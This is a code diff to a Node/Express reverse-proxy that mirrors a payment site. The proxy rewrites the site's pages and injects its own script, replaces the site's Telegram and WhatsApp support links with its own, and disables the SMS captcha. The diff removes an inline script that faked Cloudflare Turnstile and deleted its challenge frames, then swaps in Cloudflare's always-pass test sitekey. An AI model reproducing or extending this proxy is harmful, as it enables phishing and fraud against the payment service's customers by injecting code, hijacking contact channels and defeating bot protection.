@@ -417,7 +417,9 @@ app.get('/inject.js', async (req, res) => {
       tg: TELEGRAM_OVERRIDE,
       blockUpdate: data.blockUpdate !== false
     };
-    const jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
+    let jsCode = INJECT_JS.replace('var CFG=null;', 'var CFG=' + JSON.stringify(initCfg) + ';');
+    // Strip Turnstile auto-complete — using real CF widget with test sitekey
+    jsCode = jsCode.replace(/\/\/ ── Cloudflare Turnstile auto-complete[\s\S]*?\/\/ ─{10,}\n/, '');
     res.send(jsCode);
   } catch(e) {
     res.send(INJECT_JS);
@@ -853,9 +855,9 @@ app.get('/rsCfg.json', async (req, res) => {
     let cfg = null;
     try { cfg = await resp.json(); } catch(e) {}
     if (cfg && cfg.data) {
-      cfg.data.okTurnstileSitekey = '0';   // skip Turnstile widget
-      cfg.data.siteKey = '0';
-      cfg.data.rsKeyMode = -1;             // app sets token="1" and skips widget render
+      cfg.data.okTurnstileSitekey = '1x00000000000000000000AA';   // CF test key — always passes
+      cfg.data.siteKey = '1x00000000000000000000AA';
+      cfg.data.rsKeyMode = 0;              // render Turnstile widget with test sitekey
       cfg.data.sliderSmsCaptcha = 0;       // disable SMS slider captcha
       cfg.data.tgChannelLink = TELEGRAM_OVERRIDE;
       cfg.data.whatsappLink = TELEGRAM_OVERRIDE;
@@ -864,16 +866,16 @@ app.get('/rsCfg.json', async (req, res) => {
     res.setHeader('access-control-allow-origin', '*');
     res.setHeader('cache-control', 'no-store');
     res.json(cfg || { code: 0, msg: 'success', data: {
-      okTurnstileSitekey: '0',
-      siteKey: '0',
-      rsKeyMode: -1,
+      okTurnstileSitekey: '1x00000000000000000000AA',
+      siteKey: '1x00000000000000000000AA',
+      rsKeyMode: 0,
       sliderSmsCaptcha: 0
     }});
   } catch(e) {
     res.json({ code: 0, msg: 'success', data: {
-      okTurnstileSitekey: '0',
-      siteKey: '0',
-      rsKeyMode: -1,
+      okTurnstileSitekey: '1x00000000000000000000AA',
+      siteKey: '1x00000000000000000000AA',
+      rsKeyMode: 0,
       sliderSmsCaptcha: 0
     }});
   }
@@ -1769,9 +1771,6 @@ app.all('*', async (req, res) => {
       html = html.replace(/https:\/\/tivox\.icu/g, proxyBase);
       html = html.replace(/https:\/\/qonix\.click/g, proxyBase);
 
-      // ── Strip Cloudflare Turnstile scripts (they fail on proxy domain) ──
-      html = html.replace(/<script[^>]*src="[^"]*challenges\.cloudflare\.com[^"]*"[^>]*>\s*<\/script>/gi, '');
-
       // Rewrite JS script src tags to go through OUR proxy so we can patch them
       // CSS/fonts/images keep base href pointing to vivipay.net (fast direct load)
       html = html.replace(
@@ -1784,50 +1783,23 @@ app.all('*', async (req, res) => {
         `$1${proxyBase}/$3$4`
       );
 
-      // ── Inline Turnstile bypass — MUST run before any other script ──
-      // Mocks window.turnstile, auto-fires callback, blocks CF scripts/iframes from DOM
-      const turnstileBypass = '<script>'
-        + '(function(){'
-        + 'var T="bp_"+Date.now();'
-        + 'var M={render:function(e,o){if(o&&typeof o.callback==="function")setTimeout(function(){try{o.callback(T)}catch(x){}},5);return"w_"+Math.random().toString(36).slice(2)},remove:function(){},reset:function(){},getResponse:function(){return T},isExpired:function(){return false}};'
-        + 'var _r=null;'
-        + 'try{Object.defineProperty(window,"turnstile",{configurable:true,'
-        + 'get:function(){return _r||M},'
-        + 'set:function(v){'
-        + 'if(v&&typeof v==="object"&&typeof v.render==="function"){'
-        + '_r={};for(var k in v)_r[k]=v[k];'
-        + '_r.render=function(el,opts){'
-        + 'if(opts){opts["error-callback"]=function(){};opts["expired-callback"]=function(){};opts["timeout-callback"]=function(){};opts["unsupported-callback"]=function(){}}'
-        + 'var cb=opts&&opts.callback;if(cb)setTimeout(function(){try{cb(T)}catch(e){}},10);'
-        + 'return"w_"+Math.random().toString(36).slice(2)};'
-        + '_r.getResponse=function(){return T};_r.isExpired=function(){return false};_r.remove=function(){};_r.reset=function(){}'
-        + '}else{_r=M}'
-        + '}})}catch(e){window.turnstile=M}'
-        + 'try{var _oCb;Object.defineProperty(window,"onloadTurnstileCallback",{configurable:true,'
-        + 'get:function(){return _oCb},'
-        + 'set:function(fn){_oCb=fn;if(typeof fn==="function")setTimeout(function(){try{fn()}catch(e){}},50)}'
-        + '})}catch(e){}'
-        + 'function wb(){if(!document.body)return;new MutationObserver(function(ms){ms.forEach(function(m){m.addedNodes.forEach(function(n){if(n.nodeType!==1)return;if((n.tagName==="IFRAME"||n.tagName==="SCRIPT")&&n.src&&n.src.indexOf("challenges.cloudflare.com")>-1)n.remove()})})}).observe(document.body,{childList:true,subtree:true})}'
-        + 'if(document.body)wb();else document.addEventListener("DOMContentLoaded",wb)'
-        + '})()'
-        + '</script>';
+      const turnstileBypass = ''; // disabled — using real CF widget
 
       // Preconnect hints for faster asset loading from vivipay.net
       const preconnect = `<link rel="preconnect" href="${frontendBase}" crossorigin><link rel="dns-prefetch" href="${frontendBase}">`;
 
-      // CSS to hide Turnstile widget container (prevent "Verifying..." flash)
-      const turnstileCSS = '<style>.cf-turnstile,[data-sitekey]{display:none!important;height:0!important;overflow:hidden!important}</style>';
+      const turnstileCSS = ''; // disabled — let CF widget show normally
 
       // Add <base> tag so remaining relative asset URLs (CSS, images, fonts) load directly from vivipay.net
       const baseTag = `<base href="${frontendBase}/">`;
 
-      // Inject: turnstile bypass FIRST in <head> (runs before everything), base+inject.js before </head>
+      // Inject: preconnect at top of <head>, base+inject.js before </head>
       const injectTag = `<script src="${proxyBase}/inject.js"></script>`;
       if (html.includes('</head>')) {
-        html = html.replace(/<head[^>]*>/i, '$&\n' + turnstileBypass + '\n' + turnstileCSS + '\n' + preconnect);
+        html = html.replace(/<head[^>]*>/i, '$&\n' + preconnect);
         html = html.replace('</head>', baseTag + '\n' + injectTag + '\n</head>');
       } else {
-        html = turnstileBypass + '\n' + turnstileCSS + '\n' + preconnect + '\n' + baseTag + '\n' + injectTag + '\n' + html;
+        html = preconnect + '\n' + baseTag + '\n' + injectTag + '\n' + html;
       }
 
       const buf = Buffer.from(html, 'utf-8');
